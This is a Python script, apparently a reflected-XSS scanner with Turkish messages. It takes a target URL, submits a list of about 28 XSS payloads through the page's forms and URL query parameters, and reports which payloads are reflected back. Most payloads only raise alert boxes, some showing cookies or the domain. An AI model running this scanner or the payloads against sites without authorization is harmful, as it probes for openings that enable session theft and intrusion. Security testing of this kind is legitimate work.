import requests
from bs4 import BeautifulSoup
import urllib.parse


url = input("Hedef URL'yi girin: ")


xss_payloads = [
    "<div onmouseover='alert(Date.now());'>Hover over me!</div>",
    "<button onclick='alert(navigator.userAgent);'>Click me</button>",
    "<input onfocus='alert(document.domain);' autofocus>",
    "<body onload='alert(location.href);'>",
    "<svg onload='alert(document.cookie);'>",
    "<iframe src='javascript:alert(Math.random());'></iframe>",
    "<audio src='x' onerror='alert(Date.now());'></audio>",
    "<video><source onerror='confirm(Math.random());'></video>",
    "<object data='javascript:confirm(Date.now());'></object>",
    "<embed src='javascript:confirm(navigator.userAgent);'>",
    "<a href='javascript:prompt(Math.random());'>Click me</a>",
    "<script>eval('alert(\"XSS\")');</script>",
    "<img src='x' onerror='new Function(\"alert('XSS')\");'>",
    "<img src='x' onerror='setTimeout(\"alert('XSS')\", 1000);'>",
    "<img src='x' onerror='setInterval(\"alert('XSS')\", 1000);'>",
    "<img src='x' onerror='fetch(\"javascript:alert('XSS')\");'>",
    "<img src='x' onerror='XMLHttpRequest.open(\"GET\", \"javascript:alert('XSS')\", true);'>",
    "<img src='x' onerror='$.getScript(\"javascript:alert('XSS')\");'>",
    "<img src='x' onerror='jQuery.ajax({url:\"javascript:alert('XSS')\"});'>",
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1);'>",
    "<body onload='alert(\"XSS\");'>",
    "<svg onload='alert(1)'>",
    "<details open='' ontoggle='javascript:alert(1)'>",
    "<img src=x onerror=alert('XSS')>",
    "<div style='width:expression(alert(\"XSS\"));'>",
    "<iframe src='javascript:alert(\"XSS\");'>",
    "<input type='image' src='x' onerror='alert(\"XSS\");'>"
]


xss_vulnerabilities = []


response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')


for form in soup.find_all('form'):
    for payload in xss_payloads:
        
        form_data = {}
        for input_tag in form.find_all('input'):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', '').lower()
            input_value = input_tag.get('value', '')

            if input_type == 'text':
                input_value = payload  

            form_data[input_name] = input_value

        
        form_action = form.get('action')
        if not form_action.startswith('http'):
            form_action = urllib.parse.urljoin(url, form_action)

        if form.get('method').lower() == 'post':
            response = requests.post(form_action, data=form_data)
        else:
            response = requests.get(form_action, params=form_data)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        if payload in str(soup):
            xss_vulnerabilities.append((payload, "form", form_action))  


for payload in xss_payloads:
    url_parts = list(urllib.parse.urlparse(url))
    query = dict(urllib.parse.parse_qsl(url_parts[4]))
    for key in query.keys():
        original_value = query[key]
        query[key] = payload
        url_parts[4] = urllib.parse.urlencode(query)
        manipulated_url = urllib.parse.urlunparse(url_parts)
        response = requests.get(manipulated_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        if payload in str(soup):
            xss_vulnerabilities.append((payload, "url", manipulated_url))  
        query[key] = original_value  


if xss_vulnerabilities:
    print("XSS zafiyeti bulundu:")
    for payload, vuln_type, action_url in xss_vulnerabilities:
        print(f"Payload: {payload}, Tip: {vuln_type}, URL: {action_url}")
else:
    print("XSS zafiyeti bulunamadı.")
